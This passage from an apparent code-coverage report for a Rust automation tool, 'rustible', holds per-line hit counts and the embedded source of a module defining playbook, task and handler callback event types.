ine":372,"address":[30093845],"length":1,"stats":{"Line":1}},{"line":375,"address":[30093916],"length":1,"stats":{"Line":1}},{"line":377,"address":[30093948,30094492,30094027],"length":1,"stats":{"Line":0}},{"line":378,"address":[30094116,30093994,30094432],"length":1,"stats":{"Line":0}},{"line":379,"address":[30094079,30094244,30094372],"length":1,"stats":{"Line":0}},{"line":380,"address":[30094293,30094195],"length":1,"stats":{"Line":0}},{"line":383,"address":[30093930],"length":1,"stats":{"Line":1}},{"line":388,"address":[30093515,30093509,30091824],"length":1,"stats":{"Line":1}},{"line":390,"address":[30091905,30091859],"length":1,"stats":{"Line":2}},{"line":391,"address":[30091878],"length":1,"stats":{"Line":1}},{"line":392,"address":[30091915],"length":1,"stats":{"Line":1}},{"line":393,"address":[30091940],"length":1,"stats":{"Line":1}},{"line":394,"address":[30091965],"length":1,"stats":{"Line":1}},{"line":395,"address":[30091990],"length":1,"stats":{"Line":1}},{"line":396,"address":[30092015],"length":1,"stats":{"Line":1}},{"line":397,"address":[30092044],"length":1,"stats":{"Line":1}},{"line":398,"address":[30092073],"length":1,"stats":{"Line":1}},{"line":399,"address":[30092102],"length":1,"stats":{"Line":1}},{"line":400,"address":[30092131],"length":1,"stats":{"Line":1}},{"line":401,"address":[30092160],"length":1,"stats":{"Line":1}},{"line":402,"address":[30092189],"length":1,"stats":{"Line":1}},{"line":403,"address":[30092218],"length":1,"stats":{"Line":1}},{"line":404,"address":[30092247],"length":1,"stats":{"Line":1}},{"line":405,"address":[30092276],"length":1,"stats":{"Line":1}},{"line":406,"address":[30092305],"length":1,"stats":{"Line":1}},{"line":407,"address":[30092334],"length":1,"stats":{"Line":1}},{"line":408,"address":[30092363],"length":1,"stats":{"Line":1}},{"line":409,"address":[30092392],"length":1,"stats":{"Line":1}},{"line":410,"address":[30092421],"length":1,"stats":{"Line":1}},{"line":411,"address":[30092447],"length":1,"stats":{"Line":1}},{"line":412,"address":[30092473],"length":1,"stats":{"Line":1}},{"line":413,"address":[30092499],"length":1,"stats":{"Line":1}},{"line":414,"address":[30092525],"length":1,"stats":{"Line":1}},{"line":416,"address":[30092563],"length":1,"stats":{"Line":1}},{"line":418,"address":[30092777,30092893,30092593,30093009,30092648],"length":1,"stats":{"Line":5}},{"line":424,"address":[30093366],"length":1,"stats":{"Line":1}},{"line":426,"address":[30092575],"length":1,"stats":{"Line":1}},{"line":431,"address":[30098150,30097600,30098156],"length":1,"stats":{"Line":1}},{"line":432,"address":[30097698],"length":1,"stats":{"Line":1}},{"line":433,"address":[30097733],"length":1,"stats":{"Line":1}},{"line":436,"address":[30097740],"length":1,"stats":{"Line":1}},{"line":437,"address":[30097841,30097780],"length":1,"stats":{"Line":2}},{"line":438,"address":[30098027],"length":1,"stats":{"Line":1}},{"line":439,"address":[30098082],"length":1,"stats":{"Line":1}},{"line":440,"address":[30098121],"length":1,"stats":{"Line":1}},{"line":441,"address":[30098138],"length":1,"stats":{"Line":1}},{"line":444,"address":[30098039],"length":1,"stats":{"Line":1}},{"line":445,"address":[30098051],"length":1,"stats":{"Line":1}},{"line":450,"address":[30097586,30097536,30096032],"length":1,"stats":{"Line":1}},{"line":451,"address":[30096103],"length":1,"stats":{"Line":1}},{"line":452,"address":[30096137],"length":1,"stats":{"Line":0}},{"line":455,"address":[30096177],"length":1,"stats":{"Line":1}},{"line":456,"address":[30096314,30096219],"length":1,"stats":{"Line":2}},{"line":457,"address":[30096372],"length":1,"stats":{"Line":0}},{"line":460,"address":[30096394,30096331],"length":1,"stats":{"Line":2}},{"line":461,"address":[30096421],"length":1,"stats":{"Line":1}},{"line":463,"address":[30096523,30096428],"length":1,"stats":{"Line":2}},{"line":464,"address":[30096728],"length":1,"stats":{"Line":1}},{"line":465,"address":[30097555],"length":1,"stats":{"Line":1}},{"line":468,"address":[30096834,30097068,30096881],"length":1,"stats":{"Line":3}},{"line":470,"address":[30096753,30096861],"length":1,"stats":{"Line":1}},{"line":473,"address":[30097094],"length":1,"stats":{"Line":1}},{"line":474,"address":[30097427],"length":1,"stats":{"Line":1}},{"line":475,"address":[30097524],"length":1,"stats":{"Line":1}},{"line":478,"address":[30097457],"length":1,"stats":{"Line":1}},{"line":486,"address":[30105216,30105541,30105547],"length":1,"stats":{"Line":1}},{"line":487,"address":[30105267],"length":1,"stats":{"Line":1}},{"line":488,"address":[30105277,30105373],"length":1,"stats":{"Line":2}},{"line":492,"address":[30102741,30102747,30102416],"length":1,"stats":{"Line":1}},{"line":493,"address":[30102467],"length":1,"stats":{"Line":1}},{"line":494,"address":[30102573,30102477],"length":1,"stats":{"Line":2}},{"line":498,"address":[30099571,30099328,30099577],"length":1,"stats":{"Line":1}},{"line":499,"address":[30099368],"length":1,"stats":{"Line":1}},{"line":500,"address":[30099377,30099458],"length":1,"stats":{"Line":2}},{"line":504,"address":[30103099,30102768,30103093],"length":1,"stats":{"Line":1}},{"line":505,"address":[30102819],"length":1,"stats":{"Line":1}},{"line":506,"address":[30102925,30102829],"length":1,"stats":{"Line":2}},{"line":510,"address":[30101150,30099600,30102390],"length":1,"stats":{"Line":0}},{"line":511,"address":[30099669],"length":1,"stats":{"Line":0}},{"line":513,"address":[30099682],"length":1,"stats":{"Line":0}},{"line":515,"address":[30099727],"length":1,"stats":{"Line":0}},{"line":516,"address":[30100193,30100106],"length":1,"stats":{"Line":0}},{"line":519,"address":[30099753],"length":1,"stats":{"Line":0}},{"line":520,"address":[30099772,30100310],"length":1,"stats":{"Line":0}},{"line":522,"address":[30099850],"length":1,"stats":{"Line":0}},{"line":523,"address":[30099870,30100470],"length":1,"stats":{"Line":0}},{"line":525,"address":[30099948],"length":1,"stats":{"Line":0}},{"line":526,"address":[30099968,30100637,30100682],"length":1,"stats":{"Line":0}},{"line":529,"address":[30100651,30100726],"length":1,"stats":{"Line":0}},{"line":530,"address":[30100798,30101184],"length":1,"stats":{"Line":0}},{"line":532,"address":[30100847,30100770],"length":1,"stats":{"Line":0}},{"line":535,"address":[30099993],"length":1,"stats":{"Line":0}},{"line":536,"address":[30101547,30101612,30100013],"length":1,"stats":{"Line":0}},{"line":539,"address":[30101626,30101561],"length":1,"stats":{"Line":0}},{"line":540,"address":[30101746],"length":1,"stats":{"Line":0}},{"line":541,"address":[30101761],"length":1,"stats":{"Line":0}},{"line":542,"address":[30101900,30101927],"length":1,"stats":{"Line":0}},{"line":544,"address":[30101915],"length":1,"stats":{"Line":0}},{"line":546,"address":[30100042],"length":1,"stats":{"Line":0}},{"line":547,"address":[30100062,30102001,30101936],"length":1,"stats":{"Line":0}},{"line":550,"address":[30102023,30101950],"length":1,"stats":{"Line":0}},{"line":551,"address":[30102143],"length":1,"stats":{"Line":0}},{"line":552,"address":[30102166],"length":1,"stats":{"Line":0}},{"line":553,"address":[30102318,30102378],"length":1,"stats":{"Line":0}},{"line":555,"address":[30102343],"length":1,"stats":{"Line":0}},{"line":561,"address":[30104163,30103120,30104903],"length":1,"stats":{"Line":0}},{"line":562,"address":[30103167],"length":1,"stats":{"Line":0}},{"line":564,"address":[30103177],"length":1,"stats":{"Line":0}},{"line":566,"address":[30103222,30103577],"length":1,"stats":{"Line":0}},{"line":568,"address":[30103257],"length":1,"stats":{"Line":0}},{"line":569,"address":[30103276,30103670],"length":1,"stats":{"Line":0}},{"line":571,"address":[30103327],"length":1,"stats":{"Line":0}},{"line":572,"address":[30103787,30103347],"length":1,"stats":{"Line":0}},{"line":574,"address":[30103398],"length":1,"stats":{"Line":0}},{"line":575,"address":[30103927,30103410],"length":1,"stats":{"Line":0}},{"line":577,"address":[30103435],"length":1,"stats":{"Line":0}},{"line":578,"address":[30103460,30104169],"length":1,"stats":{"Line":0}},{"line":579,"address":[30104243],"length":1,"stats":{"Line":0}},{"line":580,"address":[30104255],"length":1,"stats":{"Line":0}},{"line":581,"address":[30104391,30104415],"length":1,"stats":{"Line":0}},{"line":583,"address":[30104403],"length":1,"stats":{"Line":0}},{"line":585,"address":[30103495],"length":1,"stats":{"Line":0}},{"line":586,"address":[30103507],"length":1,"stats":{"Line":0}},{"line":587,"address":[30104417,30103523],"length":1,"stats":{"Line":0}},{"line":588,"address":[30104571,30104898],"length":1,"stats":{"Line":0}},{"line":590,"address":[30104624,30104774],"length":1,"stats":{"Line":0}},{"line":591,"address":[30104848],"length":1,"stats":{"Line":0}},{"line":592,"address":[30104890],"length":1,"stats":{"Line":0}},{"line":595,"address":[30104651,30104589],"length":1,"stats":{"Line":0}},{"line":596,"address":[30104725],"length":1,"stats":{"Line":0}},{"line":604,"address":[30098176,30099127,30099133],"length":1,"stats":{"Line":0}},{"line":605,"address":[30098219],"length":1,"stats":{"Line":0}},{"line":607,"address":[30098348],"length":1,"stats":{"Line":0}},{"line":609,"address":[30098453],"length":1,"stats":{"Line":0}},{"line":610,"address":[30098465],"length":1,"stats":{"Line":0}},{"line":612,"address":[30098652],"length":1,"stats":{"Line":0}},{"line":613,"address":[30098664],"length":1,"stats":{"Line":0}},{"line":615,"address":[30098848],"length":1,"stats":{"Line":0}},{"line":616,"address":[30098952,30098860],"length":1,"stats":{"Line":0}},{"line":620,"address":[30098272],"length":1,"stats":{"Line":0}},{"line":631,"address":[30106112],"length":1,"stats":{"Line":1}},{"line":632,"address":[30106120],"length":1,"stats":{"Line":1}},{"line":643,"address":[28352083,28350796,28352019,28350888,28350861,28350768,28352003],"length":1,"stats":{"Line":4}},{"line":644,"address":[28350854],"length":1,"stats":{"Line":1}},{"line":647,"address":[28350927],"length":1,"stats":{"Line":1}},{"line":648,"address":[28351121,28351359,28351297,28351094,28352025],"length":1,"stats":{"Line":1}},{"line":651,"address":[28351490],"length":1,"stats":{"Line":1}},{"line":654,"address":[28351613],"length":1,"stats":{"Line":1}},{"line":655,"address":[28351668],"length":1,"stats":{"Line":1}},{"line":656,"address":[28351824],"length":1,"stats":{"Line":1}},{"line":660,"address":[28340752,28340897,28340783,28340927,28342220,28345966],"length":1,"stats":{"Line":0}},{"line":661,"address":[28340974,28340871],"length":1,"stats":{"Line":0}},{"line":662,"address":[28346028,28346016,28341116],"length":1,"stats":{"Line":0}},{"line":665,"address":[28341233],"length":1,"stats":{"Line":0}},{"line":668,"address":[28341364],"length":1,"stats":{"Line":0}},{"line":669,"address":[28341409],"length":1,"stats":{"Line":0}},{"line":670,"address":[28341454],"length":1,"stats":{"Line":0}},{"line":671,"address":[28341507],"length":1,"stats":{"Line":0}},{"line":673,"address":[28341530],"length":1,"stats":{"Line":0}},{"line":674,"address":[28341720],"length":1,"stats":{"Line":0}},{"line":676,"address":[28341871],"length":1,"stats":{"Line":0}},{"line":677,"address":[28341941],"length":1,"stats":{"Line":0}},{"line":678,"address":[28341992],"length":1,"stats":{"Line":0}},{"line":679,"address":[28342242,28342069],"length":1,"stats":{"Line":0}},{"line":681,"address":[28342034,28342104],"length":1,"stats":{"Line":0}},{"line":684,"address":[28341998,28341950],"length":1,"stats":{"Line":0}},{"line":686,"address":[28342008,28342383],"length":1,"stats":{"Line":0}},{"line":689,"address":[28342410],"length":1,"stats":{"Line":0}},{"line":690,"address":[28342523,28342460,28343302],"length":1,"stats":{"Line":0}},{"line":691,"address":[28342566,28342599],"length":1,"stats":{"Line":0}},{"line":692,"address":[28342766],"length":1,"stats":{"Line":0}},{"line":694,"address":[28342781,28342847],"length":1,"stats":{"Line":0}},{"line":695,"address":[28342973,28342893],"length":1,"stats":{"Line":0}},{"line":697,"address":[28342980,28343178],"length":1,"stats":{"Line":0}},{"line":698,"address":[28343249,28343323],"length":1,"stats":{"Line":0}},{"line":699,"address":[28343421],"length":1,"stats":{"Line":0}},{"line":700,"address":[28343628],"length":1,"stats":{"Line":0}},{"line":703,"address":[28343643],"length":1,"stats":{"Line":0}},{"line":704,"address":[28343742,28343825,28343687],"length":1,"stats":{"Line":0}},{"line":706,"address":[28343660,28343706],"length":1,"stats":{"Line":0}},{"line":708,"address":[28343716],"length":1,"stats":{"Line":0}},{"line":709,"address":[28344091,28344171,28343988],"length":1,"stats":{"Line":0}},{"line":711,"address":[28343957,28344055],"length":1,"stats":{"Line":0}},{"line":713,"address":[28344065],"length":1,"stats":{"Line":0}},{"line":714,"address":[28344517,28344334,28344437],"length":1,"stats":{"Line":0}},{"line":716,"address":[28344303,28344401],"length":1,"stats":{"Line":0}},{"line":718,"address":[28344411],"length":1,"stats":{"Line":0}},{"line":719,"address":[28344680,28344788,28344856],"length":1,"stats":{"Line":0}},{"line":721,"address":[28344747,28344649],"length":1,"stats":{"Line":0}},{"line":724,"address":[28345045,28344757],"length":1,"stats":{"Line":0}},{"line":725,"address":[28345072],"length":1,"stats":{"Line":0}},{"line":726,"address":[28345134],"length":1,"stats":{"Line":0}},{"line":727,"address":[28345196],"length":1,"stats":{"Line":0}},{"line":729,"address":[28345258],"length":1,"stats":{"Line":0}},{"line":730,"address":[28345290],"length":1,"stats":{"Line":0}},{"line":731,"address":[28345399,28345338,28345470],"length":1,"stats":{"Line":0}},{"line":733,"address":[28345361,28345307],"length":1,"stats":{"Line":0}},{"line":735,"address":[28345371,28345656],"length":1,"stats":{"Line":0}},{"line":738,"address":[28345272],"length":1,"stats":{"Line":0}},{"line":742,"address":[28343287],"length":1,"stats":{"Line":0}},{"line":745,"address":[28342581],"length":1,"stats":{"Line":0}},{"line":748,"address":[28345794],"length":1,"stats":{"Line":0}},{"line":751,"address":[28345839],"length":1,"stats":{"Line":0}},{"line":755,"address":[30088365],"length":1,"stats":{"Line":4}},{"line":756,"address":[28339338],"length":1,"stats":{"Line":1}},{"line":758,"address":[28339427],"length":1,"stats":{"Line":1}},{"line":759,"address":[28339574],"length":1,"stats":{"Line":1}},{"line":762,"address":[28339594],"length":1,"stats":{"Line":1}},{"line":763,"address":[28339773],"length":1,"stats":{"Line":1}},{"line":764,"address":[28339788],"length":1,"stats":{"Line":1}},{"line":765,"address":[28339932,28340328],"length":1,"stats":{"Line":2}},{"line":767,"address":[28340450],"length":1,"stats":{"Line":1}},{"line":769,"address":[28339957],"length":1,"stats":{"Line":1}},{"line":772,"address":[28339977],"length":1,"stats":{"Line":1}},{"line":773,"address":[28340156],"length":1,"stats":{"Line":1}},{"line":777,"address":[28339067,28339201,28338963,28339214,28338944,28339040],"length":1,"stats":{"Line":0}},{"line":778,"address":[28339017,28339102],"length":1,"stats":{"Line":0}},{"line":779,"address":[28339177],"length":1,"stats":{"Line":0}},{"line":780,"address":[28339189],"length":1,"stats":{"Line":0}},{"line":784,"address":[28340691,28340672],"length":1,"stats":{"Line":0}},{"line":790,"address":[28348097,28346167,28346048,28346197,28349940,28346079],"length":1,"stats":{"Line":4}},{"line":793,"address":[28346141,28346244],"length":1,"stats":{"Line":2}},{"line":794,"address":[28346320,28346260],"length":1,"stats":{"Line":2}},{"line":796,"address":[28346759,28346421],"length":1,"stats":{"Line":1}},{"line":797,"address":[28346756,28346465,28346764],"length":1,"stats":{"Line":0}},{"line":798,"address":[28346442,28346563],"length":1,"stats":{"Line":2}},{"line":799,"address":[28346565,28346501,28346560],"length":1,"stats":{"Line":2}},{"line":800,"address":[28346715,28346530,28346677],"length":1,"stats":{"Line":3}},{"line":801,"address":[28346639,28346720,28346712],"length":1,"stats":{"Line":2}},{"line":803,"address":[28346675,28346679,28346611],"length":1,"stats":{"Line":2}},{"line":808,"address":[28346793],"length":1,"stats":{"Line":1}},{"line":810,"address":[28346808],"length":1,"stats":{"Line":1}},{"line":811,"address":[28347023],"length":1,"stats":{"Line":1}},{"line":813,"address":[28347038],"length":1,"stats":{"Line":1}},{"line":815,"address":[28347291],"length":1,"stats":{"Line":1}},{"line":816,"address":[28347257],"length":1,"stats":{"Line":1}},{"line":817,"address":[28347268],"length":1,"stats":{"Line":1}},{"line":818,"address":[28347275],"length":1,"stats":{"Line":1}},{"line":820,"address":[28347306,28347397],"length":1,"stats":{"Line":2}},{"line":821,"address":[28347424],"length":1,"stats":{"Line":1}},{"line":824,"address":[28347599],"length":1,"stats":{"Line":1}},{"line":825,"address":[28347650],"length":1,"stats":{"Line":1}},{"line":826,"address":[28347691,28347782],"length":1,"stats":{"Line":2}},{"line":827,"address":[28348143,28347865],"length":1,"stats":{"Line":0}},{"line":833,"address":[28347826,28347931],"length":1,"stats":{"Line":2}},{"line":838,"address":[28347665],"length":1,"stats":{"Line":1}},{"line":839,"address":[28348492],"length":1,"stats":{"Line":1}},{"line":843,"address":[28348458,28348692],"length":1,"stats":{"Line":2}},{"line":844,"address":[28348741],"length":1,"stats":{"Line":0}},{"line":845,"address":[28348923],"length":1,"stats":{"Line":0}},{"line":846,"address":[28348938],"length":1,"stats":{"Line":0}},{"line":847,"address":[28349090],"length":1,"stats":{"Line":0}},{"line":848,"address":[28349340,28349148,28349254],"length":1,"stats":{"Line":0}},{"line":850,"address":[28349191,28349126],"length":1,"stats":{"Line":0}},{"line":852,"address":[28349208,28349526],"length":1,"stats":{"Line":0}},{"line":854,"address":[28349109],"length":1,"stats":{"Line":0}},{"line":858,"address":[28348666],"length":1,"stats":{"Line":1}},{"line":859,"address":[28349581],"length":1,"stats":{"Line":1}},{"line":860,"address":[28349632],"length":1,"stats":{"Line":0}},{"line":861,"address":[28349866],"length":1,"stats":{"Line":0}},{"line":866,"address":[28349563],"length":1,"stats":{"Line":1}},{"line":867,"address":[28349906],"length":1,"stats":{"Line":1}},{"line":871,"address":[28352851,28352140,28352202,28352229,28352835,28352112],"length":1,"stats":{"Line":0}},{"line":872,"address":[28352195],"length":1,"stats":{"Line":0}},{"line":873,"address":[28352273],"length":1,"stats":{"Line":0}},{"line":874,"address":[28352562,28352611],"length":1,"stats":{"Line":0}},{"line":880,"address":[28352287,28352417],"length":1,"stats":{"Line":0}},{"line":885,"address":[28350707,28349984,28350012,28350723,28350101,28350074],"length":1,"stats":{"Line":0}},{"line":886,"address":[28350067],"length":1,"stats":{"Line":0}},{"line":887,"address":[28350145],"length":1,"stats":{"Line":0}},{"line":888,"address":[28350213,28350427],"length":1,"stats":{"Line":0}},{"line":894,"address":[28350159,28350289],"length":1,"stats":{"Line":0}}],"covered":195,"coverable":358},{"path":["/","home","artur","Repositories","rustible","src","callback","types.rs"],"content":"//! Callback event types for Rustible's plugin system\n//!\n//! This module defines the event and context types used by the callback system\n//! to notify plugins about playbook execution lifecycle events.\n//!\n//! ## Event Categories\n//!\n//! - **Playbook Events**: Start/end of entire playbook execution\n//! - **Play Events**: Start/end of individual plays\n//! - **Task Events**: Task lifecycle (start, ok, failed, skipped, unreachable)\n//! - **Handler Events**: Handler triggering and execution\n//! - **Runner Events**: Loop iteration and retry events\n//! - **Stats Events**: Final execution statistics\n\nuse std::collections::HashMap;\nuse std::path::PathBuf;\nuse std::time::{Duration, Instant};\n\nuse indexmap::IndexMap;\nuse serde::{Deserialize, Serialize};\nuse serde_json::Value as JsonValue;\n\n// Re-export executor types for convenience\npub use crate::executor::task::{TaskDiff, TaskResult, TaskStatus};\npub use crate::executor::{ExecutionStats, HostResult};\n\n// ============================================================================\n// Core Event Enum\n// ============================================================================\n\n/// All possible callback events during playbook execution.\n///\n/// Events are emitted at various lifecycle points and carry context-specific\n/// information about the current state of execution.\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(tag = \"event_type\", rename_all = \"snake_case\")]\npub enum CallbackEvent {\n    // -------------------------------------------------------------------------\n    // Playbook Lifecycle Events\n    // -------------------------------------------------------------------------\n    /// Emitted when a playbook starts execution.\n    ///\n    /// This is the first event for any playbook run.\n    PlaybookStart {\n        /// Information about the playbook being executed\n        playbook: PlaybookInfo,\n        /// Timestamp when execution started\n        #[serde(skip)]\n        started_at: Option\u003cInstant\u003e,\n    },\n\n    /// Emitted when a playbook completes execution (success or failure).\n    ///\n    /// This is the last event for any playbook run.\n    PlaybookEnd {\n        /// Information about the playbook that was executed\n        playbook: PlaybookInfo,\n        /// Final execution statistics per host\n        stats: HashMap\u003cString, ExecutionStats\u003e,\n        /// Whether the playbook completed successfully\n        success: bool,\n        /// Total duration of playbook execution\n        #[serde(with = \"duration_serde\")]\n        duration: Duration,\n    },\n\n    // -------------------------------------------------------------------------\n    // Play Lifecycle Events\n    // -------------------------------------------------------------------------\n    /// Emitted when a play starts execution.\n    PlayStart {\n        /// Information about the play being executed\n        play: PlayInfo,\n        /// Index of this play within the playbook (0-based)\n        play_index: usize,\n    },\n\n    /// Emitted when a play completes execution.\n    PlayEnd {\n        /// Information about the play that was executed\n        play: PlayInfo,\n        /// Index of this play within the playbook (0-based)\n        play_index: usize,\n        /// Execution statistics for this play\n        stats: HashMap\u003cString, ExecutionStats\u003e,\n        /// Whether the play completed successfully\n        success: bool,\n        /// Duration of play execution\n        #[serde(with = \"duration_serde\")]\n        duration: Duration,\n    },\n\n    // -------------------------------------------------------------------------\n    // Task Lifecycle Events\n    // -------------------------------------------------------------------------\n    /// Emitted when a task starts execution on a host.\n    TaskStart {\n        /// Information about the task being executed\n        task: TaskInfo,\n        /// Whether this is a handler task\n        is_handler: bool,\n        /// Whether this task is conditional\n        is_conditional: bool,\n    },\n\n    /// Emitted when a task completes successfully.\n    TaskOk {\n        /// Information about the task that was executed\n        task: TaskInfo,\n        /// Result information from the task\n        result: ResultInfo,\n        /// Whether this is a handler task\n        is_handler: bool,\n    },\n\n    /// Emitted when a task fails.\n    TaskFailed {\n        /// Information about the task that failed\n        task: TaskInfo,\n        /// Result information from the failed task\n        result: ResultInfo,\n        /// Whether errors were ignored for this task\n        ignore_errors: bool,\n        /// Whether this is a handler task\n        is_handler: bool,\n    },\n\n    /// Emitted when a task is skipped (condition not met).\n    TaskSkipped {\n        /// Information about the task that was skipped\n        task: TaskInfo,\n        /// Result information (contains skip reason)\n        result: ResultInfo,\n        /// Whether this is a handler task\n        is_handler: bool,\n    },\n\n    /// Emitted when a host is unreachable for a task.\n    TaskUnreachable {\n        /// Information about the task that could not execute\n        task: TaskInfo,\n        /// Result information (contains unreachable reason)\n        result: ResultInfo,\n        /// Whether this is a handler task\n        is_handler: bool,\n    },\n\n    // -------------------------------------------------------------------------\n    // Handler Events\n    // -------------------------------------------------------------------------\n    /// Emitted when a handler is triggered by a task notification.\n    HandlerTriggered {\n        /// Name of the handler that was triggered\n        handler_name: String,\n        /// Name of the task that triggered the handler\n        notifying_task: String,\n        /// Host on which the handler was triggered\n        host: String,\n    },\n\n    /// Emitted when a handler starts execution.\n    HandlerStart {\n        /// Information about the handler task\n        task: TaskInfo,\n        /// Name of the handler\n        handler_name: String,\n    },\n\n    /// Emitted when a handler completes successfully.\n    HandlerOk {\n        /// Information about the handler task\n        task: TaskInfo,\n        /// Result information from the handler\n        result: ResultInfo,\n        /// Name of the handler\n        handler_name: String,\n    },\n\n    /// Emitted when a handler fails.\n    HandlerFailed {\n        /// Information about the handler task\n        task: TaskInfo,\n        /// Result information from the failed handler\n        result: ResultInfo,\n        /// Name of the handler\n        handler_name: String,\n    },\n\n    // -------------------------------------------------------------------------\n    // Runner Events (Loop and Retry)\n    // -------------------------------------------------------------------------\n    /// Emitted when a task is being retried.\n    RunnerRetry {\n        /// Information about the task being retried\n        task: TaskInfo,\n        /// Current retry attempt (1-based)\n        attempt: usize,\n        /// Maximum retry attempts\n        max_attempts: usize,\n        /// Result from the failed attempt\n        result: ResultInfo,\n        /// Delay before next retry\n        #[serde(with = \"duration_serde\")]\n        delay: Duration,\n    },\n\n    /// Emitted when a loop item completes successfully.\n    RunnerItemOk {\n        /// Information about the task\n        task: TaskInfo,\n        /// Result information for this item\n        result: ResultInfo,\n        /// The loop item that was processed\n        item: JsonValue,\n        /// Index of this item in the loop (0-based)\n        item_index: usize,\n        /// Total number of items in the loop\n        total_items: usize,\n    },\n\n    /// Emitted when a loop item fails.\n    RunnerItemFailed {\n        /// Information about the task\n        task: TaskInfo,\n        /// Result information for this item\n        result: ResultInfo,\n        /// The loop item that failed\n        item: JsonValue,\n        /// Index of this item in the loop (0-based)\n        item_index: usize,\n        /// Total number of items in the loop\n        total_items: usize,\n    },\n\n    // -------------------------------------------------------------------------\n    // Statistics Events\n    // -------------------------------------------------------------------------\n    /// Emitted at the end of execution with final statistics.\n    ///\n    /// This provides a comprehensive summary of the entire playbook run.\n    Stats {\n        /// Final statistics per host\n        stats: HashMap\u003cString, ExecutionStats\u003e,\n        /// Total execution time\n        #[serde(with = \"duration_serde\")]\n        total_duration: Duration,\n        /// Custom data that can be added by callbacks\n        custom_data: HashMap\u003cString, JsonValue\u003e,\n    },\n\n    // -------------------------------------------------------------------------\n    // Informational Events\n    // -------------------------------------------------------------------------\n    /// Emitted for debug messages during execution.\n    Debug {\n        /// The debug message\n        msg: String,\n        /// Host context (if applicable)\n        host: Option\u003cString\u003e,\n        /// Additional data\n        data: Option\u003cJsonValue\u003e,\n    },\n\n    /// Emitted for warning messages during execution.\n    Warning {\n        /// The warning message\n        msg: String,\n        /// Host context (if applicable)\n        host: Option\u003cString\u003e,\n    },\n\n    /// Emitted for deprecation warnings.\n    Deprecated {\n        /// The deprecation message\n        msg: String,\n        /// Version when the feature will be removed\n        removal_version: Option\u003cString\u003e,\n        /// Suggested alternative\n        alternative: Option\u003cString\u003e,\n    },\n}\n\nimpl CallbackEvent {\n    /// Returns the event type name as a string.\n    pub fn event_type(\u0026self) -\u003e \u0026'static str {\n        match self {\n            CallbackEvent::PlaybookStart { .. } =\u003e \"playbook_start\",\n            CallbackEvent::PlaybookEnd { .. } =\u003e \"playbook_end\",\n            CallbackEvent::PlayStart { .. } =\u003e \"play_start\",\n            CallbackEvent::PlayEnd { .. } =\u003e \"play_end\",\n            CallbackEvent::TaskStart { .. } =\u003e \"task_start\",\n            CallbackEvent::TaskOk { .. } =\u003e \"task_ok\",\n            CallbackEvent::TaskFailed { .. } =\u003e \"task_failed\",\n            CallbackEvent::TaskSkipped { .. } =\u003e \"task_skipped\",\n            CallbackEvent::TaskUnreachable { .. } =\u003e \"task_unreachable\",\n            CallbackEvent::HandlerTriggered { .. } =\u003e \"handler_triggered\",\n            CallbackEvent::HandlerStart { .. } =\u003e \"handler_start\",\n            CallbackEvent::HandlerOk { .. } =\u003e \"handler_ok\",\n            CallbackEvent::HandlerFailed { .. } =\u003e \"handler_failed\",\n            CallbackEvent::RunnerRetry { .. } =\u003e \"runner_retry\",\n            CallbackEvent::RunnerItemOk { .. } =\u003e \"runner_item_ok\",\n            CallbackEvent::RunnerItemFailed { .. } =\u003e \"runner_item_failed\",\n            CallbackEvent::Stats { .. } =\u003e \"stats\",\n            CallbackEvent::Debug { .. } =\u003e \"debug\",\n            CallbackEvent::Warning { .. } =\u003e \"warning\",\n            CallbackEvent::Deprecated { .. } =\u003e \"deprecated\",\n        }\n    }\n\n    /// Returns the host associated with this event, if any.\n    pub fn host(\u0026self) -\u003e Option\u003c\u0026str\u003e {\n        match self {\n            CallbackEvent::TaskStart { task, .. }\n            | CallbackEvent::TaskOk { task, .. }\n            | CallbackEvent::TaskFailed { task, .. }\n            | CallbackEvent::TaskSkipped { task, .. }\n            | CallbackEvent::TaskUnreachable { task, .. }\n            | CallbackEvent::HandlerStart { task, .. }\n            | CallbackEvent::HandlerOk { task, .. }\n            | CallbackEvent::HandlerFailed { task, .. }\n            | CallbackEvent::RunnerRetry { task, .. }\n            | CallbackEvent::RunnerItemOk { task, .. }\n            | CallbackEvent::RunnerItemFailed { task, .. } =\u003e Some(\u0026task.host),\n            CallbackEvent::HandlerTriggered { host, .. } =\u003e Some(host),\n            CallbackEvent::Debug { host, .. } | CallbackEvent::Warning { host, .. } =\u003e {\n                host.as_deref()\n            }\n            _ =\u003e None,\n        }\n    }\n\n    /// Returns whether this is a failure event.\n    pub fn is_failure(\u0026self) -\u003e bool {\n        matches!(\n            self,\n            CallbackEvent::TaskFailed {\n                ignore_errors: false,\n                ..\n            } | CallbackEvent::TaskUnreachable { .. }\n                | CallbackEvent::HandlerFailed { .. }\n                | CallbackEvent::RunnerItemFailed { .. }\n        )\n    }\n\n    /// Returns whether this event is related to a handler.\n    pub fn is_handler_event(\u0026self) -\u003e bool {\n        matches!(\n            self,\n            CallbackEvent::HandlerTriggered { .. }\n                | CallbackEvent::HandlerStart { .. }\n                | CallbackEvent::HandlerOk { .. }\n                | CallbackEvent::HandlerFailed { .. }\n        ) || matches!(\n            self,\n            CallbackEvent::TaskStart {\n                is_handler: true,\n                ..\n            } | CallbackEvent::TaskOk {\n                is_handler: true,\n                ..\n            } | CallbackEvent::TaskFailed {\n                is_handler: true,\n                ..\n            } | CallbackEvent::TaskSkipped {\n                is_handler: true,\n                ..\n            } | CallbackEvent::TaskUnreachable {\n                is_handler: true,\n                ..\n            }\n        )\n    }\n}\n\n// ============================================================================\n// Context Structs\n// ============================================================================\n\n/// Information about a playbook being executed.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct PlaybookInfo {\n    /// Name of the playbook\n    pub name: String,\n    /// Path to the playbook file (if loaded from disk)\n    pub file_path: Option\u003cPathBuf\u003e,\n    /// Number of plays in the playbook\n    pub play_count: usize,\n    /// Playbook-level variables (sanitized, secrets removed)\n    #[serde(default)]\n    pub vars: IndexMap\u003cString, JsonValue\u003e,\n    /// Variable files referenced by the playbook\n    #[serde(default)]\n    pub vars_files: Vec\u003cString\u003e,\n    /// Check mode enabled\n    pub check_mode: bool,\n    /// Diff mode enabled\n    pub diff_mode: bool,\n    /// Verbosity level\n    pub verbosity: u8,\n    /// Extra variables provided via command line\n    #[serde(default)]\n    pub extra_vars: HashMap\u003cString, JsonValue\u003e,\n}\n\nimpl PlaybookInfo {\n    /// Create a new PlaybookInfo from a playbook and config.\n    pub fn new(name: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            file_path: None,\n            play_count: 0,\n            vars: IndexMap::new(),\n            vars_files: Vec::new(),\n            check_mode: 